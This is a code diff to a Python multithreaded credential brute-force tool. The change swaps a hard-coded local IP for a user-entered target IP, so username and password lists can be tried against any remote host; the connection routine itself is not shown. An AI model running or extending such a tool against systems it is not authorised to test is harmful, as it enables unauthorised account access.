@@ -15,6 +15,7 @@ class Main():
         self.verbose = input('\n\nPrint failes: ')
         self.thr = int(input('Please enter threads number (10-100): '))
         self.timeout = float(input('Timeout between each check (0.1-2): '))
+        self.target = input('Please enter target ip: ')
 
 
     def connect(self, host, uname, password):
@@ -54,7 +55,7 @@ class Main():
 
                     for i in open(path, 'r+', encoding='utf-8'):
                         time.sleep(self.timeout)
-                        t = threading.Thread(target= self.connect, args=[LOCAL_IP, i, i])
+                        t = threading.Thread(target= self.connect, args=[self.target, i, i])
                         t.start()
 
                 elif self.checked >= len(f.readlines()):
@@ -73,7 +74,7 @@ class Main():
 
                     for i in range(0, len(users)):
                         time.sleep(self.timeout)
-                        t = threading.Thread(target= self.connect, args=[LOCAL_IP, users[i], passwords[i]])
+                        t = threading.Thread(target= self.connect, args=[self.target, users[i], passwords[i]])
                         t.start()
 
                 elif self.checked >= len(users):
@@ -90,7 +91,7 @@ class Main():
                     
                     for i in range(0, len(users)):
                         time.sleep(self.timeout)
-                        t = threading.Thread(target= self.connect, args=[LOCAL_IP, users[i], passwords[i]])
+                        t = threading.Thread(target= self.connect, args=[self.target, users[i], passwords[i]])
                         t.start()
 
                 elif self.checked >= len(users):
